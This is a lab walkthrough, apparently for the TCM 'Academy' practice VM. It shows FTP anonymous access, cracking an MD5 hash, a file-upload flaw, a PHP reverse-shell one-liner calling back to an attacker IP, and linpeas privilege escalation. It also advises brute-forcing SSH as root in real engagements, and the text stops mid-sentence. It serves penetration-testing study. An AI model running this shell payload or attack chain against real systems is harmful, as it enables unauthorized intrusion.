First of all set up academy on your VM ware

![](https://i.imgur.com/sqlEL3g.png)

Now use the logs `root:tcm` and you should be logged in successfully, Once logged in you can use the command `dhclient` followed by `ip a` to check for machine ip address

![](https://i.imgur.com/oVlP40y.png)

Time to run our Nmap scan on targets, first of all directly SSH to the target using the host system to make things easier for us to interact with the Machine instead of clicking VM Ware always

![](https://i.imgur.com/cTGXvph.png)

![](https://i.imgur.com/aGx2Ruw.png)

If you have problems connecting, Make sure to set network to bridge then run `dhclient` before `ip a` 

Running our Nmap scan , Query `nmap -p- -sCV 192.168.0.108 -v --min-rate=1000 -T4 -oN nmap_academy.txt`

![](https://i.imgur.com/v6wqzFu.png)

## Enumeration

> Usually in CTF's we erase enumerating port 22/SSH out of the board, cos' we don't usually go through that route except we find a valid username and start brute forcing for passwords, But in real-world scenario, You should brute force ssh using `root` as username and seeing if the account uses a weak credential, also try to see if you can bypass detection, like trying to log in over 500 attempts without getting detected, that is a security risk you should add to your reports


**Starting with FTP** 

We have anonymous login on FTP, so let start out with that, Remember nmap told us we have `anonymous` login with a `note.txt`

![](https://i.imgur.com/SHmlC7f.png)

Checking what the note.txt has, give us this 

![](https://i.imgur.com/MRhguMj.png)

Nice !!!, `cd73502828457d15655bbd7a63fb0bc8` , looks like a password though "Learn SQL😆" , but stored in MD5, you can use `hash-identifier` to check it out in kali , soo we will be cracking it using `john-the-ripper`  

![](https://i.imgur.com/BeXT0EU.png)

We got the password which is `student` , we need to try it out somewhere so since we found port 80/HTTP , let check it out

![](https://i.imgur.com/5hsUFWn.png)

We have a default Apache web page, trying out directory bruteforce gives us `academy` and `phpmyadmin` 

![](https://i.imgur.com/jnxSiyX.png)

Checking out `/academy` we have a login page, using the credentials we got `10201321:student` we were successfully logged in

![](https://i.imgur.com/MX9LNyp.png)

Navigating the websites i found a file upload vulnerability on `/academy/my-profile.php`

![](https://i.imgur.com/ORgyyqB.png)

We can upload our PHP reverse shell file, Get one from https://www.revshells.com/ , save it in a file with the `.php` extension and upload it as an image file, but before we do that start a netcat listener with `nc -lvnp 1337` , then go ahead with uploading the PHP file 

![](https://i.imgur.com/iS3YC7v.png)

Now paste in your reverse shell payload on the execute bar, i will be using `php -r '$sock=fsockopen("192.168.0.157",1337);exec("/bin/bash <&3 >&3 2>&3");'` for my payload, after pasting these you should get a connection on your terminal

![](https://i.imgur.com/xG9ZJFD.png)

Great, we got shell back as `www-data` so we need to do privilege escalation 

![](https://i.imgur.com/BoFJmdz.png)

We will be using `Linpeas.sh` for this lab, you can transfer it to the target system by using python and wget , also make sure to grant executable permissions and run with `./linpeas.sh`

![](https://i.imgur.com/X80fXIh.png)

We found a backup folder on 

![Uploading file...51991]()


